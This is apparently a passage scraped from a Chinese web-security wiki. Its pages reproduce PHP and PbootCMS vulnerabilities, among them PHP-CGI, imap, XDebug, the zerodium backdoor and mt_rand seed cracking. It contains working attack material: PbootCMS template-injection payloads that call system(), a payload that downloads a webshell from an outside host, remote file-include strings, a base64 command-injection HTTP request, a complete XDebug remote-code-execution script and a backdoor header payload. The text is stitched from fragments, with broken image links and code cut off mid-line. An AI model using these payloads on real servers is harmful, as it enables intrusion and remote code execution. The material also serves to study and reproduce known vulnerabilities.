利用一个copy()函数到远程服务器上下载一个webshell放在本地，这里的webshell地址通过chr()函数一个个还原出shell地址一个个拼接。 向模板注入该payload： 访问前台触发点： 则会去http://mock.x.dnshia.cn/shell下载webshell，并保存到1.php 参考链接 https://xz.aliyun.com/t/7628 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:59:30 "},"Web安全/PbootCMS/PbootCMS v2.0.7 默认数据库下载/PbootCMS v2.0.7 默认数据库下载.html":{"url":"Web安全/PbootCMS/PbootCMS v2.0.7 默认数据库下载/PbootCMS v2.0.7 默认数据库下载.html","title":"PbootCMS v2.0.7 默认数据库下载","keywords":"","body":"PbootCMS v2.0.7 默认数据库下载 一、漏洞简介 二、漏洞影响 PbootCMS v2.0.7 三、复现过程 默认的数据库路径是/data/pbootcms.db，且data目录下没有进行任何的判断，后台也没有提供修改数据库路径的功能，所以可直接下载。 www.0-sec.org/data/pbootcms.db 下载后用sqlite3打开就可以得到用户的hash，hash使用的是md5(md5($pass))生成的。 参考链接 https://xz.aliyun.com/t/7628 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:59:33 "},"Web安全/PbootCMS/PbootCMS v2.0.9 远程代码执行漏洞/PbootCMS v2.0.9 远程代码执行漏洞.html":{"url":"Web安全/PbootCMS/PbootCMS v2.0.9 远程代码执行漏洞/PbootCMS v2.0.9 远程代码执行漏洞.html","title":"PbootCMS v2.0.9 远程代码执行漏洞","keywords":"","body":"PbootCMS v2.0.9 远程代码执行漏洞 一、漏洞简介 二、漏洞影响 PbootCMS v2.0.9 三、复现过程 漏洞分析 漏洞可以利用的原因在于apps\\home\\controller\\ParserController.php中parserIfLabel函数对if标签解析时安全检验做的不够全面，函数主要存在两处安全校验，如图 对于第一处if判断，我们可以在函数名和括号之间插入控制字符，如\\x01，这样即可绕过该处正则校验，并且可以正常执行php代码，该trick来源于KCon2019的一个议题 完整的ppt可以参见文末链接 对于第二处对于敏感函数的过滤，完整的校验如下 if (preg_match('/(\\$_GET\\[)|(\\$_POST\\[)|(\\$_REQUEST\\[)|(\\$_COOKIE\\[)|(\\$_SESSION\\[)|(file_put_contents)|(file_get_contents)|(fwrite)|(phpinfo)|(base64)|(`)|(shell_exec)|(eval)|(assert)|(system)|(exec)|(passthru)|(print_r)|(urldecode)|(chr)|(include)|(request)|(__FILE__)|(__DIR__)|(copy)/i', $matches[1][$i])) { $danger = true; } 在这里其实做的过滤并不全面，我们可以扩展思路，结合一些其他函数，例如call_user_func函数来进行利用，同时可以参考PHP无参数RCE的考点，将可控输入点转移到请求包的header头中，直接绕过cms中存在的一些过滤项，上面的利用方式中，使用了getallheaders()同时配合一些数组操作函数来达到执行任意代码的目的 漏洞复现 在github上下载源码 https://github.com/hnaoyun/PbootCMS 安装后去https://www.pbootcms.com/freesn/获取授权码，登录后台添加授权码即可 正常登录后台，在站点信息中插入如下代码并且保存 保存后我们来到前台首页，使用burpsuite进行抓包，将数据包中的cookie头设为assert，Proxy-Connection头设置为想要执行的php代码，测试图片中使用的代码为system(\\'whoami\\') 如图 可以看到成功的执行了php代码 参考链接 https://xz.aliyun.com/t/7918 https://github.com/knownsec/KCon/blob/master/2019/25%E6%97%A5/PHP%E5%8A%A8%E6%80%81%E7%89%B9%E6%80%A7%E7%9A%84%E6%8D%95%E6%8D%89%E4%B8%8E%E9%80%83%E9%80%B8.pdf Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:59:36 "},"Web安全/PbootCMS/PbootCMS v3.0.1 远程代码执行漏洞/PbootCMS v3.0.1 远程代码执行漏洞.html":{"url":"Web安全/PbootCMS/PbootCMS v3.0.1 远程代码执行漏洞/PbootCMS v3.0.1 远程代码执行漏洞.html","title":"PbootCMS v3.0.1 远程代码执行漏洞","keywords":"","body":"PbootCMS v3.0.1 远程代码执行漏洞 一、漏洞简介 二、漏洞影响 PbootCMS v3.0.1 三、复现过程 漏洞分析 依然是先查看apps\\home\\controller\\ParserController.php中的parserIfLabel方法的两个if标签的过滤项 if (preg_match_all('/([\\w]+)([\\/\\*\\\\%\\w\\s\\\\\\\\]+)?\\(/i', $matches[1][$i], $matches2)) { foreach ($matches2[1] as $value) { if (function_exists($value) && ! in_array($value, $white_fun)) { $danger = true; break; } } } if (preg_match('/(\\$_GET\\[)|(\\$_POST\\[)|(\\$_REQUEST\\[)|(\\$_COOKIE\\[)|(\\$_SESSION\\[)|(file_put_contents)|(file_get_contents)|(fwrite)|(phpinfo)|(base64)|(`)|(shell_exec)|(eval)|(assert)|(system)|(exec)|(passthru)|(pcntl_exec)|(popen)|(proc_open)|(print_r)|(print)|(urldecode)|(chr)|(include)|(request)|(__FILE__)|(__DIR__)|(copy)|(call_user_)|(preg_replace)|(array_map)|(array_reverse)|(getallheaders)|(get_headers)|(decode_string)|(htmlspecialchars)/i', $matches[1][$i])) 关于第一处的判断，我们依然可以使用在函数名和括号之间插入控制字符的方法来绕过该处校验，对于第二处，可以看到在黑名单中相较于上个分析版本（2.0.9）添加了getallheaders的黑名单判断，于是该处我们需要寻找新的方法来实现代码执行的目的，这让我想到了array_filter函数 通过该函数我们可以实现执行php代码，例如array_filter([\\'whoami\\'],\\'system\\'); 那么接下来我们需要思考如何绕过黑名单中对system的检测，在这里我们依然可以将system放到header头中，这里可以使用session_id(session_start())的方法来取到session的值，我们可以将session的值置为system，就可以成功的调用system函数来执行命令了，通过上面的思路写出利用payload使用的时候却发生了如下问题 该处的冒号被替换成了@符号，通过查看github更新记录可以发现如下代码段 该处使用了正则来替换我们输入的if标签，为了绕过该处正则的替换我们可以使用反斜杠来进行绕过，例如{pboot:if}{/pboot:if}，该处的反斜杠会被写入数据库，而在程序调用该段数据并渲染到前台的模板时会调用到stripcslashes函数，进而删除反斜杠，代码位于core\\function\\handle.php中，如图 漏洞复现 通过上面的分析，我们易得如下payload {pboot\\:if(var_dump(array_filter(['whoami'],session_id(session_start()))))}bbbbb{/pboot\\:if} 来到后台站点信息处 插入上述poc并保存，然后来到前台首页，访问前台首页抓取数据包，将cookie中session的配置项改为system,如图 可以看到成功执行了system(\"whoami\"); 参考链接 https://xz.aliyun.com/t/8321 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:59:39 "},"Web安全/Php/（CVE-2012-1823）PHP-CGI远程代码执行漏洞/（CVE-2012-1823）PHP-CGI远程代码执行漏洞.html":{"url":"Web安全/Php/（CVE-2012-1823）PHP-CGI远程代码执行漏洞/（CVE-2012-1823）PHP-CGI远程代码执行漏洞.html","title":"（CVE-2012-1823）PHP-CGI远程代码执行漏洞","keywords":"","body":"（CVE-2012-1823）PHP-CGI远程代码执行漏洞 一、漏洞简介 二、漏洞影响 php \\ 三、复现过程 cgi模式下有如下可控命令行参数可用： -c 指定php.ini文件（PHP的配置文件）的位置 -n 不要加载php.ini文件 -d 指定配置项 -b 启动fastcgi进程 -s 显示文件源码 -T 执行指定次该文件 -h和-? 显示帮助 ​ 那么最简单的利用方式就是-s可以直接显示源码PHP-CGI远程代码执行漏洞/media/rId24.png)-d参数好像就文件包含吧 payload: -d+allow_url_include%3don+-d+auto_append_file%3dphp://input 需要注意的是 =要用%3d(url编下码) 空格用+号代替或者%20 -d+allow_url_include%3don+-d+auto_prepend_file%3dphp://input 上面两种都行只不过一个在页面顶部加载文件一个是页面底部加载文件 auto_prepend_file 在页面顶部加载文件 auto_append_file 在页面底部加载文件 PHP-CGI远程代码执行漏洞/media/rId26.png)远程包含: payload: -d allow_url_include%3don+-d+auto_prepend_file%3dhttp://ip/1.txt PHP-CGI远程代码执行漏洞/media/rId27.png) 本地包含: payload: curl -H \"USER-AGENT:\" url -d auto_prepend_file%3d/proc/self/environ+-n 这里介绍下/proc/self/environ在文件包含中的作用 如果服务器已过响应时间，还可以通过LFI重新利用，包括存储在User_Agent的/proc/self/environ文件，我们将把我们的PHP代码放置其中用于执行CMD命令 我们可以把php代码放进user-agent里然后进行本地包含 但是我这里用bp修改user-agent不知道为什么不行 (一直显示超时) PHP-CGI远程代码执行漏洞/media/rId28.png) 不过我们还是可以进行本地包含的 使用curl来完成 payload: curl -H \"USER-AGENT:\" https://www.0-sec.org:8080/index.php?-d+auto_prepend_file%3d/proc/self/environ+-n -o xxx.txt PHP-CGI远程代码执行漏洞/media/rId29.png) 当然也可以使用之前提到的反弹shell Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:00:00 "},"Web安全/Php/（CVE-2018-19518）PHP imap 远程命令执行漏洞/（CVE-2018-19518）PHP imap 远程命令执行漏洞.html":{"url":"Web安全/Php/（CVE-2018-19518）PHP imap 远程命令执行漏洞/（CVE-2018-19518）PHP imap 远程命令执行漏洞.html","title":"（CVE-2018-19518）PHP imap 远程命令执行漏洞","keywords":"","body":"（CVE-2018-19518）PHP imap 远程命令执行漏洞 一、漏洞简介 php imap扩展用于在PHP中执行邮件收发操作。其imap_open函数会调用rsh来连接远程shell，而debian/ubuntu中默认使用ssh来代替rsh的功能（也就是说，在debian系列系统中，执行rsh命令实际执行的是ssh命令）。 因为ssh命令中可以通过设置-oProxyCommand=来调用第三方命令，攻击者通过注入注入这个参数，最终将导致命令执行漏洞。 二、漏洞影响 三、复现过程 POST / HTTP/1.1 Host: www.0-sec.org Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 125 hostname=x+-oProxyCommand%3decho%09ZWNobyAnMTIzNDU2Nzg5MCc%2bL3RtcC90ZXN0MDAwMQo%3d|base64%09-d|sh}&username=111&password=222 PHPimap远程命令执行漏洞/media/rId24.png) Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:00:02 "},"Web安全/Php/（CVE-2019-11043）PHP 远程命令执行/（CVE-2019-11043）PHP 远程命令执行.html":{"url":"Web安全/Php/（CVE-2019-11043）PHP 远程命令执行/（CVE-2019-11043）PHP 远程命令执行.html","title":"（CVE-2019-11043）PHP 远程命令执行","keywords":"","body":"（CVE-2019-11043）远程命令执行 一、漏洞简介 NgiNginx 上 fastcgi_split_path_info 在处理带有 %0a 的请求时，会因为遇到换行符 \\n 导致 PATH_INFO 为空。而 php-fpm 在处理 PATH_INFO 为空的情况下，存在逻辑缺陷。攻击者通过精心的构造和利用，可以导致远程代码执行。 nx 上 fastcgi_split_path_info 在处理带有 %0a 的请求时，会因为遇到换行符 \\n 导致 PATH_INFO 为空。而 php-fpm 在处理 PATH_INFO 为空的情况下，存在逻辑缺陷。攻击者通过精心的构造和利用，可以导致远程代码执行。 二、漏洞影响 Nginx + php-fpm 的服务器，在使用如下配置的情况下，都可能存在远程代码执行漏洞。 location ~ ^/^.php(/|$) { fastcgi_split_path_info \\^(.+?.php)(/.*)$; fastcgi_param PATH_INFO $fastcgi_path_info; fastcgi_pass php:9000; ... } } 三、复现过程 https://github.com/ianxtianxt/CVE-2019-11043 ./phuip-fpizdam.exe [url] PHP远程命令执行/media/rId25.shtml) Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:00:03 "},"Web安全/Php/php mt_rand函数的安全问题探讨/php mt_rand函数的安全问题探讨.html":{"url":"Web安全/Php/php mt_rand函数的安全问题探讨/php mt_rand函数的安全问题探讨.html","title":"php mt_rand函数的安全问题探讨","keywords":"","body":"php mt_rand函数的安全问题探讨 mt_rand() 函数的安全性问题 php -r 'echo getrandmax().\"\\n\".mt_getrandmax().\"\\n\"; echo (pow(2,31)-1).\"\\n\";' 在我的 linux 64 位系统中,rand() 和 mt_rand() 产生的最大随机数都是2147483647, 正好是 2\\^31-1 , 也就是说随机播种的种子也是在这个范围中,0 -- 2147483647 的这个范围是允许我们进行爆破的. 但是用 php爆破比较慢 这里放一个爆破poc的d地址 php_mt_seed爆破程序 https://github.com/ianxtianxt/php-mt_rand 下面演示一下它的用法: 在例子中,我没有自己播种种子,而是让php自动去播种一个种子并产生一个随机数,然后用 php_mt_seed 这个工具把产生的随机数作为参数,去爆破种子,最后的得到了四个结果. 经过验证,四个结果都是对的.都会产生这样的一个随机数. 但是还有一个疑问,就是 php manual 中说,自动播种种子是指:在每次调用 mt_rand()函数之前都播种一次种子呢,还是多次调用 mt_rand()函数之前,只播种一次种子呢,这对于我们能否猜到产生的随机数序列至关重要. 看下面的测试: 在测试中,在没有进行手工播种的情况下产生两个连续的随机数,然后去爆破种子,得到了四个可能种子,经过测试发现其中一个种子产生的随机数序列和预期的相同,所以可以猜想在php中产生一系列的随机数时,只进行了一次播种! 那请考虑下面代码的安全性: 我们是否可以根据公开的key,猜到 $private 呢? 运行一次上面的代码: njctf$ php mtRand.php [*] This is a key for public:uS66FDD9LCR62UV3 [*] Create a private key which you don\\'t know:t3JSUHzYAv 下面演示破解过程,首先获得public key在每一位在字符串中的位置: 然后用 php_mt_seed 进行破解,这个需要的时间还是挺长的,几分钟左右. 已经成功的破解了一个seed,下面看这个seed对不对: 跟刚才的结果一模一样 : 这样就说明了,我们只需要拿到public key,就可以预测到private key 的值了. 但是在有的一些环境中，public key可能在private key之后产生，但是知道private key的位数 怎么预测private key呢？ 强大的php_mt_seed_4.0,支持一些统配的写法，把未知的都写成参数 0 0 0 0 就可以了php_mt_seed详细的使用说明。它就会跳过前面的mt_rand()的一些输出，直接匹配后面的： 下面测试我们获得了private key，来猜测public key的情况。 下面就开始破解： ➜ Desktop echo $(python -c \"print '0 '*64\") $(php mtRand.php) | xargs ~/script/php_mt_seed-4.0/php_mt_seed Pattern: SKIP SKIP SKIP SKIP SKIP SKIP SKIP SKIP SKIP SKIP SKIP SKIP SKIP SKIP SKIP SKIP EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 Version: 3.0.7 to 5.2.0 Found 0, trying 0xfc000000 - 0xffffffff, speed 65.2 Mseeds/s Version: 5.2.1+ Found 0, trying 0xf0000000 - 0xf1ffffff, speed 5.5 Mseeds/s seed = 0xf0430121 = 4030923041 (PHP 5.2.1 to 7.0.x; HHVM) Found 1, trying 0xfe000000 - 0xffffffff, speed 5.5 Mseeds/s Found 1 可以看到破解得到的seed和之前的一样。 接下来看一个 njctf中的一个例子,只贴部分关键代码: 我们的目标是猜测出filename. 这里 $seed 是 rand(0,999999999)生成的,我们不知道,但是$hash = md5(session_id() . $ss);我们却是知道的,在 cookie的SESSION中,当把cookie中的 PHPSESSID 设为空的时候,session_id()就也是空了,通过结hash,就可以获得 mt_rand() 产生的第一个随机数,然后用 php_mt_seed这工工具爆破种子,就可以直接算出文件名了. rand() 函数的安全性问题 rand() 函数在产生随机数的时候没有调用 srand(),则产生的随机数是有规律可询的. 具体的说明请看这里http://www.sjoerdlangkemper.nl/2016/02/11/cracking-php-rand/ 产生的随机数可以用下面这个公式预测 : state[i] = state[i-3] + state[i-31] (一般预测值可能比实际值要差1) 写下面测试代码,验证一下: =31) { echo \"$randStr[$i]=(\".$randStr[$i-31].\"+\".$randStr[$i-3].\") mod 31\".\"\\n\"; } } ?> 看一下结果: 发现预测的值,基本都是对的,这样就可以根据之前生成的随机数,预 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:59:53 "},"Web安全/Php/Php screw加密与破解/（一）Php screw加密与破解工具（php-screw-brute）/（一）Php screw加密与破解工具（php-screw-brute）.html":{"url":"Web安全/Php/Php screw加密与破解/（一）Php screw加密与破解工具（php-screw-brute）/（一）Php screw加密与破解工具（php-screw-brute）.html","title":"（一）Php screw加密与破解工具（php-screw-brute）","keywords":"","body":"（一）Php screw加密与破解工具（php-screw-brute） 项目地址 https://github.com/ianxtianxt/php-screw-brute 此脚本可以恢复/爆破php screw使用的密钥。PHP Screw使用压缩文件的长度来确定（硬编码）密钥的起始索引。PHP Screw的工作原理是首先使用ZLIB（级别1）压缩PHP文件，然后按位取反，再与密钥进行异或。 因为ZLIB具有固定的头部并且不同文件的起始索引不同，所以可以恢复密钥的一部分， 其余字节可以爆破。 通常，你拥有的文件越多，恢复密钥的速度就越快。 当然，所有文件都必须使用相同的PHP Screw密钥进行加密。 如果你拥有的文件足够多，则可直接恢复密钥而不需要爆破。 下图是php文件经过php screw加密后的一个样子，通过开头的\"PM9SCREW\"字符串得知使用了php screw进行加密。Phpscrew加密与破解工具(php-screw-brute)/media/rId21.png) 使用方法 下图是使用方法，解密成功后，会在相同目录下生成以\".plain\"为后缀的同名文件。比如待解密的文件是\"index.php\"，则解密成功后生成\"index.php.plain\"文件。Phpscrew加密与破解工具(php-screw-brute)/media/rId23.png) 写了一个python脚本，用于筛选解密成功的php文件。 #!/usr/bin/python # -*- coding: UTF-8 -*- import os import shutil def main(): src = '/root/Download/demo' dst = src + '_backup' shutil.copytree(src,dst) #备份 for root,dirs,files in os.walk(src): for name in files: basename, ext = os.path.splitext(name) oldname = os.path.join(root,name) newname = os.path.join(root,basename) if ext == '.php': os.remove(oldname) #删除原来的加密的PHP文件 if ext == '.plain': os.rename(oldname,newname) #重命名解密成功的文件 filename.php.plain => filename.php print('Good job') if __name__ == '__main__': main() 参考链接 https://www.cnblogs.com/StudyCat/p/11268399.html Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:59:45 "},"Web安全/Php/Php screw加密与破解/（三）通过IDA获取加密的key/（三）通过IDA获取加密的key.html":{"url":"Web安全/Php/Php screw加密与破解/（三）通过IDA获取加密的key/（三）通过IDA获取加密的key.html","title":"（三）通过IDA获取加密的key","keywords":"","body":"（三）通过IDA获取加密的key 通过导图查找 首先找到php_screw.so文件，然后通过IDA分析（幸好之前跟基友要了份IDA）。加密过程是在pm9screw_ext_fopen函数中实现的，所以只需要到这个函数中去找加密部分即可。通过IDA获取加密的key/media/rId22.png) 找到pm9screw_ext_fopen函数，双击，如下图所示： 通过IDA获取加密的key/media/rId23.png) 然后右边的窗口就会如下图所示： 通过IDA获取加密的key/media/rId24.png) 很明显，我标黄的就是加密密钥了，双击跳转至其指针保存处： 通过IDA获取加密的key/media/rId25.png) 再次双击，跟踪变量，见下图，打码处就是密钥了。 通过IDA获取加密的key/media/rId26.png) 如下图，右键，将十六进制的密钥转成十进制的，然后打开screwdecode.c，见下图9，将密钥替换掉，即可使用screw_decode解密。 通过IDA获取加密的key/media/rId27.png) 通过IDA获取加密的key/media/rId28.png) 通过伪代码查找 再找到目标函数之后，使用F5，查看伪代码，双击黄标也可以跳转到之前找到的位置。 通过IDA获取加密的key/media/rId30.png) 参考链接 https://www.cnblogs.com/StudyCat/p/11268399.html Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:59:46 "},"Web安全/Php/Php screw加密与破解/（二）Php screw加密与破解工具（screw_decode）/（二）Php screw加密与破解工具（screw_decode）.html":{"url":"Web安全/Php/Php screw加密与破解/（二）Php screw加密与破解工具（screw_decode）/（二）Php screw加密与破解工具（screw_decode）.html","title":"（二）Php screw加密与破解工具（screw_decode）","keywords":"","body":"（二）Php screw加密与破解工具（screw_decode） 项目地址 https://github.com/ianxtianxt/screw_decode 项目介绍 前提需要有加密之后的文件，和加密的扩展库php_screw.so 打开screwdecode.c找到PM9SCREW,PM9SCREW_LEN和pm9screw_mycryptkey，3个可能被使用者修改，需要用IDA去查找然后替换掉。 pm9screw_mycryptkey是至关重要的，拿不到就解密不了。别的两个可以暴力尝试解决,其实就是读取掉头部n个字节尝试解密。 安装与使用方法 安装： git clone https://github.com/ianxtianxt/screw_decode.git make 如果以上出错，就看报错然后google,一个是依赖php-devel，一个是依赖zlibc-devel 使用： sudo ./decode path 说明: 结果保存在同目录，文件名字为原文件名字后面追加.decode, sudo 权限保证可以有chdir和创建文件权限。 参考链接 https://www.cnblogs.com/StudyCat/p/11268399.html Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:59:48 "},"Web安全/Php/Php screw加密与破解/（四）php-screw加密文件/（四）php-screw加密文件.html":{"url":"Web安全/Php/Php screw加密与破解/（四）php-screw加密文件/（四）php-screw加密文件.html","title":"（四）php-screw加密文件","keywords":"","body":"（四）php-screw加密文件 项目地址 https://github.com/ianxtianxt/php-screw 安装命令 我是在kali-rolling上测试的，提示没有phpize这个命令。 apt-get install php-dev 然后解压 tar –zxvf php_screw-1.5.tar.gz php-screw加密文件/media/rId21.png) 编译PHP扩展的工具，主要是根据系统信息生成对应的configure文件 Phpize ./configure php-screw加密文件/media/rId22.png)php-screw加密文件/media/rId23.png) 编辑my_screw.h修改pm9screw_mycryptkey密钥的值 如下图，是默认值 php-screw加密文件/media/rId24.png) 此外我们可以编辑php_screw.h修改PM9SCREW 和 PM9SCREW_LEN的值，注意PM9SCREW_LEN的值要小于等于PM9SCREW的长度。如下图是其默认值。 php-screw加密文件/media/rId25.png) 进行编译 如下图编译时出错了，在php_screw的目录下以下命令执行即可解决，最后编译成功。 sed -i \"s/CG(extended_info) = 1;/CG(compiler_options) |= ZEND_COMPILE_EXTENDED_INFO;/g\" php_screw.c php-screw加密文件/media/rId26.png) 将编译好的php_screw.so拷贝到php扩展库目录。 通过phpinfo()页面查找extension-dir关键字 php-screw加密文件/media/rId27.png) 将编译好的php_screw.so拷贝到php扩展目录。 cp modules/php_screw.so /usr/lib/php/20151012/php_screw.so 编辑php.ini添加以下一行代码 extension=php_screw.so 重启http服务器 Service apache2 restart 编译加密工具 cd tools make 编译完成后生成screw可执行文件。> php-screw加密文件/media/rId28.png){width=\"5.833333333333333in\" height=\"2.4657994313210847in\"} 尝试加密一个php文件 我们写一个phpinfo.php文件内容是 然后执行./screw phpinfo.php加密文件，见下图 php-screw加密文件/media/rId29.png) 将加密好的文件拷贝到web目录 cp phpinfo.php /var/www/html/phpinfo.php php-screw加密文件/media/rId30.png) 批量加密php文件 find /data/php/source -name “*.php” -print|xargs -n1 screw //加密所有的.php文件 参考链接 https://www.cnblogs.com/StudyCat/p/11268399.html Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:59:50 "},"Web安全/Php/Php XDebug 远程调试漏洞/Php XDebug 远程调试漏洞.html":{"url":"Web安全/Php/Php XDebug 远程调试漏洞/Php XDebug 远程调试漏洞.html","title":"Php XDebug 远程调试漏洞","keywords":"","body":"Php XDebug 远程调试漏洞 一、漏洞简介 XDebug是PHP的一个扩展，用于调试PHP代码。如果目标开启了远程调试模式，并设置remote_connect_back = 1： xdebug.remote_connect_back = 1 xdebug.remote_enable = 1 这个配置下，我们访问http://www.0-sec.org/index.php?XDEBUG_SESSION_START=phpstorm，目标服务器的XDebug将会连接访问者的IP（或X-Forwarded-For头指定的地址）并通过dbgp协议与其通信，我们通过dbgp中提供的eval方法即可在目标服务器上执行任意PHP代码。 二、漏洞影响 三、复现过程 因为需要使用dbgp协议与目标服务器通信，所以无法用http协议复现漏洞。 我编写了一个漏洞复现脚本，指定目标web地址、待执行的php代码即可： # 要求用python3并安装requests库 python3 exp.py -t http://www.0-sec.org:8080/index.php -c 'shell_exec('id');' #!/usr/bin/env python3 import re import sys import time import requests import argparse import socket import base64 import binascii from concurrent.futures import ThreadPoolExecutor pool = ThreadPoolExecutor(1) session = requests.session() session.headers = { 'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)' } def recv_xml(sock): blocks = [] data = b'' while True: try: data = data + sock.recv(1024) except socket.error as e: break if not data: break while data: eop = data.find(b'\\x00') if eop = 4: break return blocks[3] def trigger(url): time.sleep(2) try: session.get(url + '?XDEBUG_SESSION_START=phpstorm', timeout=0.1) except: pass if __name__ == '__main__': parser = argparse.ArgumentParser(description='XDebug remote debug code execution.') parser.add_argument('-c', '--code', required=True, help='the code you want to execute.') parser.add_argument('-t', '--target', required=True, help='target url.') parser.add_argument('-l', '--listen', default=9000, type=int, help='local port') args = parser.parse_args() ip_port = ('0.0.0.0', args.listen) sk = socket.socket() sk.settimeout(10) sk.bind(ip_port) sk.listen(5) pool.submit(trigger, args.target) conn, addr = sk.accept() conn.sendall(b''.join([b'eval -i 1 -- ', base64.b64encode(args.code.encode()), b'\\x00'])) data = recv_xml(conn) print('[+] Recieve data: ' + data.decode()) g = re.search(rb'', data, re.I) if not g: print('[-] No result...') sys.exit(0) data = g.group(1) try: print('[+] Result: ' + base64.b64decode(data).decode()) except binascii.Error: print('[-] May be not string result...') 重要说明：因为该通信是一个反向连接的过程，exp.py启动后其实是会监听本地的9000端口（可通过-l参数指定）并等待XDebug前来连接，所以执行该脚本的服务器必须有外网IP（或者与目标服务器处于同一内网）。 参考链接 https://vulhub.org/\\#/environments/php/xdebug-rce/ Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:59:56 "},"Web安全/Php/PHP zerodium后门漏洞/PHP zerodium后门漏洞.html":{"url":"Web安全/Php/PHP zerodium后门漏洞/PHP zerodium后门漏洞.html","title":"PHP zerodium后门漏洞","keywords":"","body":"PHP zerodium后门漏洞 漏洞描述 PHP开发工程师Jake Birchall在对其中一个恶意COMMIT的分析过程中发现，在代码中注入的后门是来自一个PHP代码被劫持的网站上，并且采用了远程代码执行的操作，并且攻击者盗用了PHP开发人员的名义来提交此COMMIT。 目前为止PHP官方并未就该事件进行更多披露，表示此次服务器被黑的具体细节仍在调查当中。由于此事件的影响，PHP的官方代码库已经被维护人员迁移至GitHub平台，之后的相关代码更新、修改将会都在GitHub上进行。 漏洞影响 [!NOTE] PHP 8.1.0-dev FOFA [!NOTE] \"PHP/8.1.0-dev\" 漏洞复现 后门为添加请求头 User-Agentt: zerodiumsystem('id'); [!NOTE] 是 User-Agentt 不是 User-Agent 反弹shell Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:59:57 "},"Web安全/Php/PHP序列化和反序列化语法差异问题/PHP序列化和反序列化语法差异问题.html":{"url":"Web安全/Php/PHP序列化和反序列化语法差异问题/PHP序列化和反序列化语法差异问题.html","title":"PHP序列化和反序列化语法差异问题","keywords":"","body":"PHP序列化和反序列化语法差异问题 介绍 官方文档中介绍PHP序列化和反序列化如下： 所有php里面的值都可以使用函数serialize()来返回一个包含字节流的字符串来表示。unserialize()函数能够重新把字符串变回php原来的值。 序列化一个对象将会保存对象的所有变量，但是不会保存对象的方法，只会保存类的名字。 为了能够unserialize()一个对象，这个对象的类必须已经定义过。如果序列化类A的一个对象，将会返回一个跟类A相关，而且包含了对象所有变量值的字符串。 简单说序列化是对象转化字符串的过程，反序列化是字符串还原对象的过程。 环境 文章中所述内容使用环境如下: PHP7.3.1、SDK VSCode C++和C 环境配置建议参考：《WINDOWS下用VSCODE调试PHP7源代码》https://www.jianshu.com/p/29bc0443*6 (作者经过几小时尝试后找到最全的版本) 在网上公开参数反序列化执行流程已经非常详细，但是对于一些细节地方有一些不足，其中就包括序列化和反序列化之间的语法差异问题 差异问题 序列化 我们通过编译PHP内核源码分析，发现PHP序列化在默认情况下在对象转换中加入:{和}用来拼接成字符串。 [var.c] Line:882 static void php_var_serialize_intern() Line:896 if (ce->serialize(struc, &serialized_data, &serialized_length, (zend_serialize_data *)var_hash) == SUCCESS) { smart_str_appendl(buf, \"C:\", 2); smart_str_append_unsigned(buf, ZSTR_LEN(Z_OBJCE_P(struc)->name)); smart_str_appendl(buf, \":\\\"\", 2); smart_str_append(buf, Z_OBJCE_P(struc)->name); smart_str_appendl(buf, \"\\\":\", 2); smart_str_append_unsigned(buf, serialized_length); smart_str_appendl(buf, \":{\", 2); smart_str_appendl(buf, (char *) serialized_data, serialized_length); smart_str_appendc(buf, '}'); } Line:952 smart_str_appendl(buf, \":{\", 2); Line:995 smart_str_appendc(buf, '}'); 咱们来看上面这段代码，PHP会使用smart_str_appendl为序列化字符串前后拼接:{和}，从var.c的第882行开始进入序列化逻辑。在第896行进行序列化字符串拼接，第952行和第995行，对于内嵌方法进行拼接。 反序列化 反序列化是将序列化的字符串，按照一定语法规则进行转化还原。 [var_unserialize.c] Line:655 static int php_var_unserialize_internal() Line:674 { YYCTYPE yych; static const unsigned char yybm[] = { 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 128, 128, 128, 128, 128, 128, 128, 128, 128, 128, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, }; if ((YYLIMIT - YYCURSOR) 